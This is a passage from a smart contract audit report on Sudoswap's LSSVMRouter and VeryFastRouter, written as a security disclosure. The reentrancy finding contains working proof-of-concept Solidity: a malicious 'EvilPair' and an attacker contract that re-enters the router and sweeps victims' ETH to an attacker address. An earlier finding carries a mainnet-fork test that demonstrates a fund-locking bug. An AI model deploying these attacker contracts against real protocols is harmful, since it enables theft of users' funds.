### Specified `minOutput` will remain locked in `LSSVMRouter::swapNFTsForSpecificNFTsThroughETH`
**Description:**
The Cyfrin team understands that `LSSVMRouter` is slightly out of scope for this audit, given that it is intended to be deprecated and replaced by `VeryFastRouter`; however, a slightly modified version of this contract is currently deployed and [live on mainnet](https://etherscan.io/address/0x2b2e8cda09bba9660dca5cb6233787738ad68329#code). We have found a bug in [`LSSVMRouter::swapNFTsForSpecificNFTsThroughETH`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L88) and `LSSVMRouter::swapNFTsForAnyNFTsThroughETH` which has been validated against a mainnet fork to lock user funds sent with the function call as specified by the [`minOutput`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L90) parameter. In other words, users attempting to protect themselves from slippage will find that this causes their funds to become locked - the higher the minimum expected output specified, the higher value of funds locked.

Users specifying a non-zero `minOutput` value will have this amount [deducted](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L105) from the `inputAmount` sent on the second half of the swap, from ETH to NFTs, handled by the internal functions [`LSSVMRouter::_swapETHForSpecificNFTs`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L560) and `LSSVMRouter::_swapETHForAnyNFTs`. Given that it is the responsibility of these internal functions to issue a refund of any unspent ETH based on this [`inputAmount`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L562) parameter, the excess value represented by `minOutput` is not included in the [`remainingValue`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L566) [calculation](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L582) and so will not be included in the subsequent [ETH transfer](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L591-L595). If there are no intermediate underflows (due to a sufficiently large value of `minOutput`) then any excess ETH as specified by `minOutput` will therefore remain locked in the router forever.

Fortunately, it appears these functions have never actually been called on the mainnet deployment as they have not been connected to the Sudoswap front end. While Sudoswap doesn't use these functions on the client, contract-level integrators may find themselves with potentially lost funds, so the Sudorandom Labs team has attempted to reach out to those potentially affected.

**Proof of Concept:**
Apply the following git diff:

```diff
diff --git a/src/test/interfaces/ILSSVMPairFactoryMainnet.sol b/src/test/interfaces/ILSSVMPairFactoryMainnet.sol
new file mode 100644
index 0000000..3cdea5b
--- /dev/null
+++ b/src/test/interfaces/ILSSVMPairFactoryMainnet.sol
@@ -0,0 +1,20 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
+import {ICurve} from "../../bonding-curves/ICurve.sol";
+import {LSSVMPair} from "../../LSSVMPair.sol";
+import {LSSVMPairETH} from "../../LSSVMPairETH.sol";
+
+interface ILSSVMPairFactoryMainnet {
+    function createPairETH(
+        IERC721 _nft,
+        ICurve _bondingCurve,
+        address payable _assetRecipient,
+        LSSVMPair.PoolType _poolType,
+        uint128 _delta,
+        uint96 _fee,
+        uint128 _spotPrice,
+        uint256[] calldata _initialNFTIDs
+    ) external payable returns (LSSVMPairETH pair);
+}
diff --git a/src/test/mixins/UsingETH.sol b/src/test/mixins/UsingETH.sol
index 0e5cb40..8fecb1e 100644
--- a/src/test/mixins/UsingETH.sol
+++ b/src/test/mixins/UsingETH.sol
@@ -14,6 +14,8 @@ import {LSSVMPairFactory} from "../../LSSVMPairFactory.sol";
 import {LSSVMPairERC721} from "../../erc721/LSSVMPairERC721.sol";
 import {LSSVMPairERC1155} from "../../erc1155/LSSVMPairERC1155.sol";

+import {ILSSVMPairFactoryMainnet} from "../interfaces/ILSSVMPairFactoryMainnet.sol";
+
 abstract contract UsingETH is Configurable, RouterCaller {
     function modifyInputAmount(uint256 inputAmount) public pure override returns (uint256) {
         return inputAmount;
@@ -46,6 +48,25 @@ abstract contract UsingETH is Configurable, RouterCaller {
         return pair;
     }

+    function setupPairERC721Mainnet(
+        ILSSVMPairFactoryMainnet factory,
+        IERC721 nft,
+        ICurve bondingCurve,
+        address payable assetRecipient,
+        LSSVMPair.PoolType poolType,
+        uint128 delta,
+        uint96 fee,
+        uint128 spotPrice,
+        uint256[] memory _idList,
+        uint256,
+        address
+    ) public payable returns (LSSVMPair) {
+        LSSVMPairETH pair = factory.createPairETH{value: msg.value}(
+            nft, bondingCurve, assetRecipient, poolType, delta, fee, spotPrice, _idList
+        );
+        return pair;
+    }
+
     function setupPairERC1155(CreateERC1155PairParams memory params) public payable override returns (LSSVMPair) {
         LSSVMPairETH pair = params.factory.createPairERC1155ETH{value: msg.value}(
             params.nft,
diff --git a/src/test/single-test-cases/CyfrinLSSVMRouterPoC.t.sol b/src/test/single-test-cases/CyfrinLSSVMRouterPoC.t.sol
new file mode 100644
index 0000000..596da45
--- /dev/null
+++ b/src/test/single-test-cases/CyfrinLSSVMRouterPoC.t.sol
@@ -0,0 +1,114 @@
+// SPDX-License-Identifier: AGPL-3.0
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
+import {Test721} from "../../mocks/Test721.sol";
+
+import {ICurve} from "../../bonding-curves/ICurve.sol";
+import {ILSSVMPairFactoryMainnet} from "../interfaces/ILSSVMPairFactoryMainnet.sol";
+
+import {UsingETH} from "../mixins/UsingETH.sol";
+import {ConfigurableWithRoyalties} from "../mixins/ConfigurableWithRoyalties.sol";
+import {LinearCurve, UsingLinearCurve} from "../../test/mixins/UsingLinearCurve.sol";
+
+import {LSSVMPair} from "../../LSSVMPair.sol";
+import {LSSVMPairETH} from "../../LSSVMPairETH.sol";
+import {LSSVMRouter} from "../../LSSVMRouter.sol";
+import {RoyaltyEngine} from "../../RoyaltyEngine.sol";
+import {LSSVMPairFactory} from "../../LSSVMPairFactory.sol";
+
+
+contract CyfrinLSSVMRouterPoC is Test, ConfigurableWithRoyalties, UsingLinearCurve, UsingETH {
+    IERC721 test721;
+    address payable alice;
+
+    LSSVMRouter constant LSSVM_ROUTER = LSSVMRouter(payable(address(0x2B2e8cDA09bBA9660dCA5cB6233787738Ad68329)));
+    LSSVMPairFactory constant LSSVM_PAIR_FACTORY = LSSVMPairFactory(payable(address(0xb16c1342E617A5B6E4b631EB114483FDB289c0A4)));
+    LinearCurve constant LINEAR_CURVE = LinearCurve(payable(address(0x5B6aC51d9B1CeDE0068a1B26533CAce807f883Ee)));
+
+    function setUp() public {
+        vm.createSelectFork(vm.envOr("MAINNET_RPC_URL", string.concat("https://rpc.ankr.com/eth")));
+
+        test721 = setup721();
+        alice = payable(makeAddr("alice"));
+        deal(alice, 1 ether);
+    }
+
+    function test_minOutputIsLockedInRouterWhenCallingswapNFTsForSpecificNFTsThroughETH() public {
+        Test721(address(test721)).mint(alice, 1);
+        uint256[] memory nftToTokenTradesIds = new uint256[](1);
+        nftToTokenTradesIds[0] = 1;
+        Test721(address(test721)).mint(address(this), 2);
+        Test721(address(test721)).mint(address(this), 3);
+        Test721(address(test721)).mint(address(this), 4);
+        uint256[] memory ids = new uint256[](3);
+        ids[0] = 2;
+        ids[1] = 3;
+        ids[2] = 4;
+        uint256[] memory tokenToNFTTradesIds = new uint256[](1);
+        tokenToNFTTradesIds[0] = ids[ids.length - 1];
+
+        test721.setApprovalForAll(address(LSSVM_PAIR_FACTORY), true);
+        LSSVMPair pair721 = this.setupPairERC721Mainnet{value: 10 ether}(
+            ILSSVMPairFactoryMainnet(address(LSSVM_PAIR_FACTORY)),
+            test721,
+            LINEAR_CURVE,
+            payable(address(0)),
+            LSSVMPair.PoolType.TRADE,
+            0.1 ether, // delta
+            0.1 ether, // 10% for trade fee
+            1 ether, // spot price
+            ids,
+            10 ether,
+            address(0)
+        );
+
+        uint256 pairETHBalanceBefore = address(pair721).balance;
+        uint256 aliceETHBalanceBefore = address(alice).balance;
+        uint256 routerETHBalanceBefore = address(LSSVM_ROUTER).balance;
+
+        emit log_named_uint("pairETHBalanceBefore", pairETHBalanceBefore);
+        emit log_named_uint("aliceETHBalanceBefore", aliceETHBalanceBefore);
+        emit log_named_uint("routerETHBalanceBefore", routerETHBalanceBefore);
+
+        uint256 minOutput;
+        {
+            LSSVMRouter.PairSwapSpecific[] memory nftToTokenTrades = new LSSVMRouter.PairSwapSpecific[](1);
+            nftToTokenTrades[0] = LSSVMRouter.PairSwapSpecific({
+                pair: pair721,
+                nftIds: nftToTokenTradesIds
+            });
+
+            LSSVMRouter.PairSwapSpecific[] memory tokenToNFTTrades = new LSSVMRouter.PairSwapSpecific[](1);
+            tokenToNFTTrades[0] = LSSVMRouter.PairSwapSpecific({
+                pair: pair721,
+                nftIds: tokenToNFTTradesIds
+            });
+
+            LSSVMRouter.NFTsForSpecificNFTsTrade memory trade = LSSVMRouter.NFTsForSpecificNFTsTrade({
+                nftToTokenTrades: nftToTokenTrades,
+                tokenToNFTTrades: tokenToNFTTrades
+            });
+
+
+            vm.startPrank(alice);
+            test721.setApprovalForAll(address(LSSVM_ROUTER), true);
+            minOutput = 0.79 ether;
+            LSSVM_ROUTER.swapNFTsForSpecificNFTsThroughETH{value: 1 ether}(trade, minOutput, alice, alice, block.timestamp + 10);
+        }
+
+        uint256 pairETHBalanceAfter = address(pair721).balance;
+        uint256 aliceETHBalanceAfter = address(alice).balance;
+        uint256 routerETHBalanceAfter = address(LSSVM_ROUTER).balance;
+
+        assertTrue(test721.ownerOf(tokenToNFTTradesIds[0]) == alice);
+        assertGt(pairETHBalanceAfter, pairETHBalanceBefore);
+        assertEq(routerETHBalanceAfter, minOutput);
+
+        emit log_named_uint("pairETHBalanceAfter", pairETHBalanceAfter);
+        emit log_named_uint("aliceETHBalanceAfter", aliceETHBalanceAfter);
+        emit log_named_uint("routerETHBalanceAfter", routerETHBalanceAfter);
+    }
+}
```

**Impact:**
This vulnerability results in the locking of user funds with high impact and likelihood. If the problematic functions were integrated into a UI, then this would be evaluated as CRITICAL, but given that the current integrations significantly reduce the likelihood, we evaluate the severity as HIGH.

**Recommended Mitigation:**
Pass `minOutput` through to the internal functions to be used in refund calculations and correctly reflect the true contract balance, validating that this amount is not exceeded. This way, the [`outputAmount`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L94) [return value](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L104-L106) will correctly reflect the excess ETH transferred to the caller.

**Sudoswap:**
Acknowledged. This issue is present in current implementation of the Router, but no UIs are currently integrated to interact with this specific function. The contract is expected to be deprecated soon in favour of the VeryFastRouter.

**Cyfrin:**
Acknowledged.

### Malicious pair can re-enter `VeryFastRouter` to drain original caller's funds
**Description:**
[`VeryFastRouter::swap`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L266) is the main entry point for a user to perform a batch of sell and buy orders on the new Sudoswap router, allowing partial fill conditions to be specified. Sell orders are executed first, followed by buy orders. The `LSSVMPair` contracts themselves are implemented in such a way that re-entrancy is not possible, but the same is not true of the `VeryFastRouter`. Assuming a user calls `VeryFastRouter::swap`, selling some NFTs and passing in some additional ETH value for subsequent buy orders, an attacker can re-enter this function under certain conditions to steal the original caller's funds. Given that this function does not check whether the user input contains valid pairs, an attacker can use this to manipulate the return values of `LSSVMPair::swapNFTsForToken` and `LSSVMPair::swapTokenForSpecificNFTs`, which interferes with internal accounting. In this way, the attacker can make it appear that a buy/sell order input/output more/less value than expected.

Consider the case where the attacker is a malicious royalty recipient, and their re-entrant swap order contains a single sell order and an empty array of buy orders. Calling out to their malicious pair gives control over the [`outputAmount`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L296) value which is used in addition assignment to the [virtual balance](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L301-L302) `ethAmount` used to [transfer any remaining ETH](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L482-L486) after all orders have been executed, filled partially or otherwise. The current contract balance is the original caller's remaining ETH value, so the attacker would intend to have their malicious pair return this amount to drain the funds. However, without the introduction of a malicious pair contract to both the attacker's re-entrant order and the original caller's order, the attacker is prevented from stealing the remaining intermediate funds due to the safe ETH transfer of `ethAmount` as this will cause the original caller's transaction to revert at this same line - the contract is attempting to transfer balance that it no longer has. If this had instead been a transfer of the contract balance directly rather than a virtual balance, then the attacker could succeed in stealing the user's funds without baiting them into making a call to their malicious pair. Of course, calling a malicious pair allows it to steal any funds sent with the call, but given that this can manipulate internal accounting through an incorrect return value, as described above, calling this pair can impact other swap orders/partial fills, tricking the contract into thinking it has fewer funds than it does during the lifetime of the original caller's transaction such that the attacker can re-enter and make away with their ETH. Otherwise, the extent of this vulnerability is a DoS attack on calls to the router.

The steps to perform this exploit are as follows:

* Trick the caller into including an order on the attacker's malicious pair.
* The attacker re-enters, passing an order of sell orders and calling back to their malicious pair contract due to unvalidated user input. This inflates the `outputAmount`, which in turn inflates the `ethAmount` for their call.
* Excess ETH is sent to the attacker.
* The malicious pair manipulates `ethAmount` by returning a large `inputAmount`.
* Original caller has any additional partial buy orders fail to fill and receives no ETH in return for selling their NFTs.

The second exploit case is where the caller specifies the router contract as their token recipient, performing DIY recycle ETH functionality of sorts for subsequent buy orders, likely with zero input `msg.value`. This would allow an attacker to steal intermediate balances by re-entering the final sell order before any funds are consumed by buy orders, as these funds are not tracked by `ethAmount`, and so the final transfer will not revert. Independent of a malicious royalty recipient, this also means that any excess ETH sent not consumed by subsequent buy orders will remain locked in the contract if the caller specifies the router contract as their token recipient. Pool funds are safe due to the use of the factory re-entrancy guard, which prohibits calling into any of the pair swap functions that are responsible for transfers to the router. ETH value sent with ERC-20-based swaps due to user misconfiguration is also vulnerable in the case of malicious royalty recipient.

**Proof of Concept:**
The following diff demonstrates a honeypot pair which re-enters the swap and drains the original caller's ETH:

```diff
diff --git a/src/VeryFastRouter.sol b/src/VeryFastRouter.sol
index 16047b9..2bd3797 100644
--- a/src/VeryFastRouter.sol
+++ b/src/VeryFastRouter.sol
@@ -85,6 +85,7 @@ contract VeryFastRouter {
     error VeryFastRouter__InvalidPair();
     error VeryFastRouter__BondingCurveQuoteError();

+   event vfr_log_named_uint         (string key, uint val);
     constructor(ILSSVMPairFactoryLike _factory) {
         factory = _factory;
     }
@@ -403,12 +404,12 @@ contract VeryFastRouter {

                 // Deduct ETH amount if it's an ETH swap
                 if (order.ethAmount != 0) {
-                    console.log("deducting eth amount");
-                    console.log("before: %s", ethAmount);
+                    // console.log("deducting eth amount");
+                    // console.log("before: %s", ethAmount);
                     ethAmount -= inputAmount;
-                    console.log("after: %s", ethAmount);
-                    console.log("router balance: %s", address(this).balance);
-                    console.log("sender balance: %s", msg.sender.balance);
+                    // console.log("after: %s", ethAmount);
+                    // console.log("router balance: %s", address(this).balance);
+                    // console.log("sender balance: %s", msg.sender.balance);
                 }
             }
             // Otherwise, we need to do some partial fill calculations first
@@ -488,10 +489,15 @@ contract VeryFastRouter {
         }

         // Send excess ETH back to token recipient
-        console.log("ethAmount: %s", ethAmount);
+        emit vfr_log_named_uint("eth Amount", ethAmount);
+        emit vfr_log_named_uint("pair balance before", address(this).balance);
+        if(address(this).balance > ethAmount){
+            emit vfr_log_named_uint("pair balance after", address(this).balance - ethAmount);
+        }
+        else{
+            emit vfr_log_named_uint("pair balance after", 0);
+        }
         if (ethAmount != 0) {
-            console.log("balance: %s", address(this).balance);
-            console.log("transfering %s ETH to: %s", ethAmount, swapOrder.tokenRecipient);
             payable(swapOrder.tokenRecipient).safeTransferETH(ethAmount); // @audit-ok - doesn't seem to be a case when this is less than the actual amount to refund
         }
     }
diff --git a/src/test/base/VeryFastRouterAllSwapTypes.sol b/src/test/base/VeryFastRouterAllSwapTypes.sol
index 9909271..6294bd2 100644
--- a/src/test/base/VeryFastRouterAllSwapTypes.sol
+++ b/src/test/base/VeryFastRouterAllSwapTypes.sol
@@ -33,6 +33,9 @@ import {RoyaltyEngine} from "../../RoyaltyEngine.sol";
 import {VeryFastRouter} from "../../VeryFastRouter.sol";
 import {LSSVMPairFactory} from "../../LSSVMPairFactory.sol";

+import {EvilPair} from "../mixins/EvilPair.sol";
+import {EvilPairReentrancyAttacker} from "../mixins/EvilPairReentrancyAttacker.sol";
+
 abstract contract VeryFastRouterAllSwapTypes is Test, ERC721Holder, ERC1155Holder, ConfigurableWithRoyalties {
     ICurve bondingCurve;
     RoyaltyEngine royaltyEngine;
@@ -43,6 +46,8 @@ abstract contract VeryFastRouterAllSwapTypes is Test, ERC721Holder, ERC1155Holde
     address constant ROUTER_CALLER = address(1);
     address constant TOKEN_RECIPIENT = address(420);
     address constant NFT_RECIPIENT = address(0x69);
+    address constant PWNER = payable(address(999));
+    address constant ALICE = payable(address(666));

     uint256 constant START_INDEX = 0;
     uint256 constant NUM_BEFORE_PARTIAL_FILL = 2;
@@ -1286,4 +1291,87 @@ abstract contract VeryFastRouterAllSwapTypes is Test, ERC721Holder, ERC1155Holde
         }
         vm.stopPrank();
     }
+
+    function testSwapEvilPairReentrancyAttack_audit() public {
+        EvilPair evilPair;
+        EvilPairReentrancyAttacker evilPairReentrancyAttacker;
+        uint256 totalEthToSend = 100 ether;
+        deal(ALICE, totalEthToSend);
+
+        //0. create a pair with a bonding curve
+        uint256[] memory nftIds;
+        LSSVMPair pair;
+        nftIds = _getArray(START_INDEX, END_INDEX);
+
+        // mints END_INDEX - START_INDEX + 1 NFTs
+        pair = setUpPairERC721ForSale(0, address(0), nftIds);
+
+        (uint256 delta, uint256 spotPrice) = getReasonableDeltaAndSpotPrice();
+
+
+        //1. create a honeypotNft that again mints END_INDEX - START_INDEX + 1 nfts
+        IERC721Mintable honeypotNft = _setUpERC721(address(this), address(this), ALICE);
+
+        //2. setup a evilPair & transfer above NFTs to the evilPair
+        evilPair = new EvilPair(spotPrice, delta, address(pair.bondingCurve()), payable(address(0)), address(honeypotNft));
+        for (uint256 j; j< nftIds.length; j++){
+            IERC721(honeypotNft).transferFrom(address(this), address(evilPair), nftIds[j]);
+        }
+
+        // 3. setup evil pair attacker
+        evilPairReentrancyAttacker = new EvilPairReentrancyAttacker(router, spotPrice, PWNER, address(evilPair));
+
+        //4. set the evil pair attacker address as above
+        evilPair.setAttacker(payable(evilPairReentrancyAttacker));
+        evilPair.setReentrancyAttack(true); // just a flag to change the logic of setReentrancyAttack and swapNFTsForToken
+        evilPair.setRouterAddress(payable(router));
+        uint256[] memory partialFillAmounts = new uint256[](0);
+
+        //5. create a buy order so that we can re-enter from swapTokenForSpecificNFTs
+        VeryFastRouter.BuyOrderWithPartialFill memory attackBuyOrder = VeryFastRouter.BuyOrderWithPartialFill({
+            pair: LSSVMPair(address(evilPair)),
+            maxInputAmount: totalEthToSend,
+            ethAmount:totalEthToSend,
+            nftIds: nftIds,
+            expectedSpotPrice: pair.spotPrice(),
+            isERC721: true,
+            maxCostPerNumNFTs: partialFillAmounts
+        });
+
+       VeryFastRouter.BuyOrderWithPartialFill[] memory buyOrders =
+            new VeryFastRouter.BuyOrderWithPartialFill[](1);
+        buyOrders[0] = attackBuyOrder;
+
+        //6. Create a dummy sell order - 0 array
+        VeryFastRouter.SellOrderWithPartialFill[] memory sellOrders =
+            new VeryFastRouter.SellOrderWithPartialFill[](0);
+
+        //7. Create a swap order
+         VeryFastRouter.Order memory swapOrder = VeryFastRouter.Order({
+            buyOrders: buyOrders,
+            sellOrders: sellOrders,
+            tokenRecipient: payable(TOKEN_RECIPIENT),
+            nftRecipient: NFT_RECIPIENT,
+            recycleETH: true
+        });
+
+        //8. We calculate the price of purchasing ALL NFTs from evil pair for given bonding curve
+        // ignore royalties for this calculation
+        // initial balance of ALICE (100 ether) - input Amount should be the final balance in ALICE account after swap
+        // by re-entering and placing a fake buy txn, we can drain all of ALICE's eth
+        (, , , uint256 inputAmount, ,) = ICurve(pair.bondingCurve()).getBuyInfo(uint128(spotPrice), uint128(delta), nftIds.length, 0, 0);
+
+        emit log_named_uint("input amount to purchase all NFTs ", inputAmount);
+        emit log_named_uint("Balance in Alice Account Before ", ALICE.balance);
+        emit log_named_uint("Balance in Pwner Account Before ", PWNER.balance);
+        emit log_named_uint("Balance in Router Account Before ", address(router).balance);
+
+        // 8. Perform the swap
+        vm.prank(ALICE);
+        router.swap{value: totalEthToSend}(swapOrder);
+
+        emit log_named_uint("Balance in Alice Account After ", ALICE.balance);
+        emit log_named_uint("Balance in Pwner Account After ", PWNER.balance);
+        emit log_named_uint("Balance in Router Account After ", address(router).balance);
+    }
 }
diff --git a/src/test/mixins/EvilPair.sol b/src/test/mixins/EvilPair.sol
new file mode 100644
index 0000000..8a8ad6d
--- /dev/null
+++ b/src/test/mixins/EvilPair.sol
@@ -0,0 +1,119 @@
+// SPDX-License-Identifier: AGPL-3.0
+pragma solidity ^0.8.0;
+
+import {console} from "forge-std/Test.sol";
+import {EvilPairReentrancyAttacker} from "./EvilPairReentrancyAttacker.sol";
+import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
+import {ICurve} from "../../bonding-curves/ICurve.sol";
+
+contract EvilPair {
+    uint256 expectedSpotPrice;
+    uint256 expectedDelta;
+    address public bondingCurve;
+    address payable attacker;
+    uint256 counter;
+    uint256 inputAmount;
+    address nftAddress;
+    address payable routerAddress;
+    bool isReentrancyAttack;
+
+   event evilpair_log_named_uint         (string key, uint val);
+   event evilpair_log_named_address      (string key, address val);
+
+    constructor(uint256 _expectedSpotPrice, uint256 _delta, address _bondingCurve, address payable _attacker, address _nft) {
+        expectedSpotPrice = _expectedSpotPrice;
+        expectedDelta = _delta;
+        bondingCurve = _bondingCurve;
+        attacker = _attacker;
+        nftAddress = _nft;
+    }
+
+    function setAttacker(address payable _attacker) public {
+        attacker = _attacker;
+    }
+
+    function setReentrancyAttack(bool _isAttack) public{
+        isReentrancyAttack = _isAttack;
+    }
+
+    function setRouterAddress(address payable _router) public{
+        routerAddress = _router;
+    }
+
+    function swapNFTsForToken(
+        uint256[] calldata nftIds,
+        uint256 minExpectedTokenOutput,
+        address payable tokenRecipient,
+        bool isRouter,
+        address routerCaller
+    ) external virtual returns (uint256) {
+        if(isReentrancyAttack){
+            //calculate price of original purchase of user
+            //reserve that amount of eth for original buy txn to go through
+            // and drain the balance funds
+
+            // reserveAmount of eth calculation
+            uint256 numNfts = IERC721(nftAddress).balanceOf(address(this));
+            (, , , uint256 inputAmount, ,) = ICurve(bondingCurve).getBuyInfo(uint128(expectedSpotPrice), uint128(expectedDelta), numNfts, 0, 0);
+            emit evilpair_log_named_uint("input amount inside swapNFTForToken ", inputAmount);
+            emit evilpair_log_named_uint("balance eth in evilPair currently ", address(this).balance);
+
+
+            // we ignore royalties for this
+            if(address(this).balance > inputAmount){
+                uint256 splitPayment = (address(this).balance - inputAmount)*50/100;
+                //transfer 50% to the router to enable a payoff
+                (bool success, ) = address(routerAddress).call{value: splitPayment}("");
+                return splitPayment;
+            }
+            return 0;
+        }
+
+    }
+
+    function swapTokenForSpecificNFTs(
+        uint256[] calldata nftIds,
+        uint256 maxExpectedTokenInput,
+        address nftRecipient,
+        bool isRouter,
+        address routerCaller
+    ) external payable virtual returns (uint256) {
+        uint256 ethAmount = msg.value;
+        if(isReentrancyAttack){
+            EvilPairReentrancyAttacker(attacker).attack();
+
+        }
+        else{
+            sweepETH();
+        }
+
+        return ethAmount;
+    }
+
+    function sweepETH() public {
+        (bool success, ) = attacker.call{value: address(this).balance}("");
+        require(success, "eth sweep success");
+    }
+
+    function spotPrice() external view virtual returns (uint256) {
+        return expectedSpotPrice;
+    }
+
+    function delta() external view virtual returns (uint256) {
+        return expectedDelta;
+    }
+
+    function fee() external view virtual returns (uint256) {
+        return 0;
+    }
+
+    function nft() external view virtual returns (address) {
+        return nftAddress;
+    }
+
+    function calculateRoyaltiesView(uint256 assetId, uint256 saleAmount)
+        public
+        view
+        returns (address payable[] memory royaltyRecipients, uint256[] memory royaltyAmounts, uint256 royaltyTotal)
+    {}
+}
\ No newline at end of file
diff --git a/src/test/mixins/EvilPairReentrancyAttacker.sol b/src/test/mixins/EvilPairReentrancyAttacker.sol
new file mode 100644
index 0000000..019019f
--- /dev/null
+++ b/src/test/mixins/EvilPairReentrancyAttacker.sol
@@ -0,0 +1,79 @@
+// SPDX-License-Identifier: AGPL-3.0
+pragma solidity ^0.8.0;
+
+import {LSSVMPair} from "../../LSSVMPair.sol";
+import {VeryFastRouter} from "../../VeryFastRouter.sol";
+
+import {console} from "forge-std/Test.sol";
+
+contract EvilPairReentrancyAttacker {
+    VeryFastRouter immutable internal router;
+    uint256 immutable internal expectedSpotPrice;
+    address immutable internal PWNER;
+    address immutable internal evilPair;
+    uint256 counter;
+
+    constructor(VeryFastRouter _router, uint256 _expectedSpotPrice, address _pwner, address _evilPair) {
+        router = _router;
+        expectedSpotPrice = _expectedSpotPrice;
+        PWNER = _pwner;
+        evilPair = _evilPair;
+    }
+
+    fallback() external payable {
+        // console.log("entered fallback");
+        // if (msg.sig == this.attack.selector) {
+        //     console.log("doing attack");
+        //     attack();
+        //     return;
+        // }
+        // if (++counter == 2) {
+        //     console.log("doing attack");
+        //     attack();
+        // } else {
+        //     console.log("doing nothing");
+        //     return;
+        // }
+    }
+
+    receive() external payable {}
+
+    function attack() public {
+        console.log("executing attack");
+        VeryFastRouter.BuyOrderWithPartialFill[] memory attackBuyOrders = new VeryFastRouter.BuyOrderWithPartialFill[](0);
+        VeryFastRouter.SellOrderWithPartialFill[] memory attackSellOrders = new VeryFastRouter.SellOrderWithPartialFill[](1);
+        uint256[] memory nftInfo = new uint256[](1);
+        nftInfo[0] = 1337;
+        uint256[] memory empty = new uint256[](0);
+
+        attackSellOrders[0] = VeryFastRouter.SellOrderWithPartialFill({
+            pair: LSSVMPair(evilPair),
+            isETHSell: true,
+            isERC721: true,
+            nftIds: nftInfo,
+            doPropertyCheck: false,
+            propertyCheckParams: "",
+            expectedSpotPrice: expectedSpotPrice < type(uint128).max ? uint128(expectedSpotPrice) : type(uint128).max,
+            minExpectedOutput: 0,
+            minExpectedOutputPerNumNFTs: empty
+        });
+
+        VeryFastRouter.Order memory attackSwapOrder = VeryFastRouter.Order({
+            buyOrders: attackBuyOrders,
+            sellOrders: attackSellOrders,
+            tokenRecipient: payable(PWNER),
+            nftRecipient: PWNER,
+            recycleETH: true
+        });
+
+
+        router.swap(attackSwapOrder);
+
+        console.log("completed attack");
+    }
+
+    function sweepETH() public {
+        (bool success, ) = PWNER.call{value: address(this).balance}("");
+        require(success, "sweep eth failed");
+    }
+}
\ No newline at end of file
```

**Impact:**
This vulnerability results in the loss of user funds, with high impact and medium likelihood, so we evaluate the severity to HIGH.

**Recommended Mitigation:**
Validate user inputs to `VeryFastRouter::swap`, in particular pairs, and consider making this function non-reentrant.

**Sudoswap:**
Acknowledged, no change for now as risk surface is set to callers passing in improper arguments. Pair validation is done client-side, so less of a concern.

**Cyfrin:**
Acknowledged.

### Linearity assumption on the royalty can lead to denial of service
**Description:**
`VeryFastRouter::swap` relies on the internal functions [`VeryFastRouter::_findMaxFillableAmtForSell`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L556) and [`VeryFastRouter::_findMaxFillableAmtForBuy`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L503) to find the maximum possible amount of tokens to be swapped via binary search as below:

```solidity
VeryFastRouter.sol
576:         // Perform binary search
577:         while (start <= end) {
578:             // We check the price to sell index + 1
579:             (
580:                 CurveErrorCodes.Error error,
581:                 /* newSpotPrice */
582:                 ,
583:                 /* newDelta */
584:                 ,
585:                 uint256 currentOutput,
586:                 /* tradeFee */
587:                 ,
588:                 /* protocolFee */
589:             ) = pair.bondingCurve().getSellInfo(
590:                 spotPrice,
591:                 // get delta from deltaAndFeeMultiplier
592:                 uint128(deltaAndFeeMultiplier >> 96),
593:                 (start + end) / 2,
594:                 // get feeMultiplier from deltaAndFeeMultiplier
595:                 uint96(deltaAndFeeMultiplier),
596:                 protocolFeeMultiplier
597:             );
598:             currentOutput -= currentOutput * royaltyAmount / BASE;//@audit-info assumes royalty amount is linear
599:             // If the bonding curve has a math error, or
600:             // if the current output is too low relative to our max output, or
601:             // if the current output is greater than the pair's token balance,
602:             // then we recurse on the left half (i.e. less items)
603:             if (
604:                 error != CurveErrorCodes.Error.OK || currentOutput < minOutputPerNumNFTs[(start + end) / 2 - 1] /* this is the max cost we are willing to pay, zero-indexed */
605:                     || currentOutput > pairTokenBalance
606:             ) {
607:                 end = (start + end) / 2 - 1;
608:             }
609:             // Otherwise, we recurse on the right half (i.e. more items)
610:             else {
611:                 numItemsToFill = (start + end) / 2;
612:                 start = (start + end) / 2 + 1;
613:                 priceToFillAt = currentOutput;
614:             }
615:         }
```
The protocol is designed to integrate various royalty info providers. Line 598 assumes the royalty amount is linear; however, this assumption can be violated, especially in the case of external royalty info providers who could be malicious and return a non-linear royalty amount.
For example, the royalty amount can be a function of the number of tokens to be swapped (e.g. greater/fewer royalties for a larger/smaller sale amount).
